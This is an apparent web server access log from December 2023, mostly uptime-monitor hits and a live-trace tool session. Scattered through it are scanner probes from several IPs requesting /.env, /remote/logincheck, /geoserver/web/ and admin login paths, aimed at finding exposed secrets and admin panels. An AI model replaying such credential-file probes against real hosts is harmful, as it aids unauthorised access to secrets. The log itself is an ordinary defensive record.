167.71.120.76 - - [15/Dec/2023:04:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4872 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.176 - - [15/Dec/2023:04:35:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4873 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4874 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4875 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4876 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4877 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4878 "www@docker" "http://172.25.0.8:80" 0ms
192.241.196.123 - - [15/Dec/2023:04:38:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4879 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:04:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4880 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4881 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4882 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4883 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4884 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [15/Dec/2023:04:40:50 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4885 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:04:40:50 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4886 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4887 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4888 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4889 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4890 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4891 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4892 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.172 - - [15/Dec/2023:04:43:39 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4893 "-" "-" 0ms
198.199.118.99 - - [15/Dec/2023:04:43:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4894 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4895 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4896 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.179 - - [15/Dec/2023:04:44:52 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 4897 "-" "-" 0ms
64.62.197.167 - - [15/Dec/2023:04:45:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4898 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4899 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4900 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4901 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4902 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.181 - - [15/Dec/2023:04:46:51 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 4903 "-" "-" 0ms
64.62.197.170 - - [15/Dec/2023:04:47:08 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 4904 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4905 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4906 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.168 - - [15/Dec/2023:04:48:09 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 4907 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4908 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4909 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4910 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4911 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4912 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4913 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4914 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4915 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4916 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4917 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4918 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4919 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4920 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4921 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4922 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4923 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4924 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4925 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4926 "www@docker" "http://172.25.0.8:80" 0ms
57.129.23.166 - - [15/Dec/2023:04:57:37 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4927 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:04:57:37 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4928 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:04:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4929 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4930 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4931 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4932 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4933 "www@docker" "http://172.25.0.8:80" 0ms
118.26.39.130 - - [15/Dec/2023:05:00:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4934 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4935 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4936 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4937 "www@docker" "http://172.25.0.8:80" 0ms
162.216.149.241 - - [15/Dec/2023:05:01:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4938 "web-to-websecure@internal" "-" 0ms
162.216.149.241 - - [15/Dec/2023:05:01:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4939 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:05:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4940 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4941 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4942 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4943 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4944 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4945 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4946 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4947 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4948 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4949 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4950 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4951 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4952 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4953 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4954 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4955 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4956 "www@docker" "http://172.25.0.8:80" 1ms
198.235.24.153 - - [15/Dec/2023:05:09:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4957 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4958 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4959 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4960 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4961 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4962 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4963 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4964 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4965 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4966 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4967 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4968 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [15/Dec/2023:05:15:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4969 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:05:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4970 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:09 +0000] "GET /trace/ HTTP/2.0" 200 892 "-" "-" 4971 "livetrace@docker" "http://172.25.0.5:80" 15ms
4.26.29.194 - - [15/Dec/2023:05:16:09 +0000] "GET /trace/styles.css HTTP/2.0" 200 629 "-" "-" 4972 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:05:16:09 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 4973 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:09 +0000] "GET /trace/start.php?id=fc29f3iyf HTTP/2.0" 200 101 "-" "-" 4974 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:16:10 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 223 "-" "-" 4975 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:16:11 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 295 "-" "-" 4976 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:12 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 367 "-" "-" 4977 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:16:13 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 439 "-" "-" 4978 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:14 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 511 "-" "-" 4979 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:15 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 583 "-" "-" 4980 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:16 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 655 "-" "-" 4981 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:16:17 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 727 "-" "-" 4982 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:16:18 +0000] "GET /trace/poll.php?id=fc29f3iyf HTTP/2.0" 200 1024 "-" "-" 4983 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:05:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4984 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4985 "www@docker" "http://172.25.0.8:80" 1ms
185.180.140.5 - - [15/Dec/2023:05:16:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4986 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4987 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4988 "www@docker" "http://172.25.0.8:80" 1ms
78.153.140.221 - - [15/Dec/2023:05:17:46 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4989 "-" "-" 0ms
78.153.140.221 - - [15/Dec/2023:05:17:46 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4990 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4991 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4992 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4993 "www@docker" "http://172.25.0.8:80" 31ms
167.71.120.76 - - [15/Dec/2023:05:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4994 "www@docker" "http://172.25.0.8:80" 19ms
4.26.29.194 - - [15/Dec/2023:05:19:48 +0000] "GET /trace/ HTTP/2.0" 200 2064 "-" "-" 4995 "livetrace@docker" "http://172.25.0.5:80" 23ms
4.26.29.194 - - [15/Dec/2023:05:19:48 +0000] "GET /trace/start.php?id=s52ksx6pv HTTP/2.0" 200 101 "-" "-" 4996 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:05:19:49 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 87 "-" "-" 4997 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:50 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 87 "-" "-" 4998 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:51 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 88 "-" "-" 4999 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:52 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 88 "-" "-" 5000 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:53 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 88 "-" "-" 5001 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:19:54 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 88 "-" "-" 5002 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:55 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 88 "-" "-" 5003 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:56 +0000] "GET /trace/poll.php?id=s52ksx6pv HTTP/2.0" 200 101 "-" "-" 5004 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:19:56 +0000] "GET /trace/cleanup.php?id=s52ksx6pv HTTP/2.0" 200 71 "-" "-" 5005 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:05:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5006 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5007 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5008 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5009 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5010 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5011 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5012 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5013 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5014 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5015 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5016 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:25:28 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 5017 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:05:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5018 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:26:12 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 5019 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5020 "www@docker" "http://172.25.0.8:80" 1ms
68.69.186.30 - - [15/Dec/2023:05:26:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5021 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:05:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5022 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:05:26:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5023 "web-to-websecure@internal" "-" 0ms
35.178.157.24 - - [15/Dec/2023:05:27:04 +0000] "GET /manage/account/login HTTP/1.1" 404 19 "-" "-" 5024 "-" "-" 0ms
95.214.235.169 - - [15/Dec/2023:05:27:18 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5025 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:05:27:22 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5026 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5027 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5028 "www@docker" "http://172.25.0.8:80" 1ms
35.178.157.24 - - [15/Dec/2023:05:27:47 +0000] "GET /manage/account/login HTTP/1.1" 301 17 "-" "-" 5029 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5030 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5031 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5032 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5033 "www@docker" "http://172.25.0.8:80" 1ms
91.92.208.139 - - [15/Dec/2023:05:30:10 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 5034 "-" "-" 0ms
35.178.157.24 - - [15/Dec/2023:05:30:11 +0000] "GET /admin/index.html HTTP/1.1" 404 19 "-" "-" 5035 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5036 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5037 "www@docker" "http://172.25.0.8:80" 1ms
35.178.157.24 - - [15/Dec/2023:05:30:56 +0000] "GET /admin/index.html HTTP/1.1" 301 17 "-" "-" 5038 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5039 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5040 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5041 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5042 "www@docker" "http://172.25.0.8:80" 1ms
34.76.96.55 - - [15/Dec/2023:05:32:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5043 "web-to-websecure@internal" "-" 0ms
35.178.157.24 - - [15/Dec/2023:05:33:22 +0000] "GET /index.html HTTP/1.1" 404 19 "-" "-" 5044 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5045 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5046 "www@docker" "http://172.25.0.8:80" 1ms
35.178.157.24 - - [15/Dec/2023:05:34:05 +0000] "GET /index.html HTTP/1.1" 301 17 "-" "-" 5047 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5048 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5049 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5050 "www@docker" "http://172.25.0.8:80" 0ms
